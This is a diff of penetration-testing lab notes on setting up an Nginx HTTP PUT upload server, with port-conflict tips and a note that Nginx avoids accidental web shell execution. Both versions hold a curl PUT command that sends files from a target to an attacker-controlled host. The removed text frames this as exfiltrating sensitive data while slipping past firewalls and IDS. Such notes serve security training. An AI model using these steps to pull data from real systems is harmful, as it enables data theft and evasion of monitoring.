@@ -1,90 +1,40 @@
-## Nginx HTTP PUT Setup
+# Catching Files over HTTP/S — Nginx PUT Upload
 
-Bypassing firewalls and IDS via encrypted transit when **plaintext transfers** (like SMB or FTP) trigger alerts. Nginx is preferred over Apache to prevent **unintended web shell execution**.
+Use Nginx over Apache for upload servers — no PHP module means no accidental webshell execution.
 
-Create landing directory for incoming files
+Create the upload directory and set ownership:
 
-```
-sudo mkdir -p /var/www/uploads/<DIR>
-```
-
-Set ownership to the web service user
-
-```
-sudo chown -R www-data:www-data /var/www/uploads/<DIR>
+```bash
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
 ```
 
-Create configuration file at `/etc/nginx/sites-available/upload.conf`
+Create `/etc/nginx/sites-available/upload.conf`:
 
-```
+```nginx
 server {
-    listen <PORT>;
+    listen 9001;
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
 }
 ```
 
-> ⚠️ Gap: The source provides an incomplete Nginx configuration. For a functional **HTTP PUT** listener, the configuration requires a `location` block with `dav_methods PUT;` enabled and a defined `root` directory, which are missing from the provided text.
+Enable and start:
 
-Enable the site by symlinking to the enabled directory
-
-```
+```bash
 sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
-```
-
-Apply the new configuration
-
-```
+sudo rm /etc/nginx/sites-enabled/default
 sudo systemctl restart nginx.service
 ```
 
-- **Tool comparison**
-    
-    - Python3 `uploadserver` module -> `python3 -m uploadserver` -> use for rapid setup without persistent configuration
-    - Nginx -> `systemctl restart nginx` -> use for **secure web server** operations and avoiding Apache module security risks
-- **Dangerous / misconfigured settings**
-    
-    - Apache with PHP module enabled: high risk of **web shell execution** if uploads are permitted.
-- **Edge cases**
-    
-    - Apache enables **directory listing** by default, exposing exfiltrated files; Nginx keeps this disabled by default.
-- **Gotchas** **Address already in use** failure occurs if port 80 or the chosen port is bound to another process.
-    
+Upload from target via curl PUT:
 
-## Port Conflict Resolution
-
-Nginx fails to start or bind to a specific port due to existing services like `websockify` or default configurations.
-
-Identify the PID holding the port
-
-```
-ss -lnpt | grep <PORT>
+```bash
+curl -T <FILE> http://<LHOST>:9001/SecretUploadDirectory/<OUTFILE>
 ```
 
-Verify the process name or service
+> [!warning] Port 80 conflict on Pwnbox — something (websockify) already binds it. Use a non-standard port (9001) and remove the default Nginx config, or the service won't start. Check with `ss -lnpt | grep 80` if nginx fails to bind.
 
-```
-ps -ef | grep <PID>
-```
-
-Remove the default site to free up port 80
-
-```
-sudo rm /etc/nginx/sites-enabled/default
-```
-
-## File Exfiltration
-
-Moving sensitive data from a target to a controlled listener using built-in utilities.
-
-Upload local file to the remote Nginx listener
-
-```
-curl -T <FILE_PATH> http://<ATTACK_IP>:<PORT>/<DIR>/<FILE_NAME>
-```
-
-Confirm integrity of the exfiltrated file
-
-```
-sudo tail -1 /var/www/uploads/<DIR>/<FILE_NAME>
-```
-
-- **Gotchas** **Plaintext transfer** of sensitive files may be detected by Network IDS; use HTTPS to wrap the transfer.
+> [!tip] Verify directory listing is off by browsing to the upload path in a browser — Nginx disables it by default unlike Apache. If you see a file listing, your exfil directory is exposed.
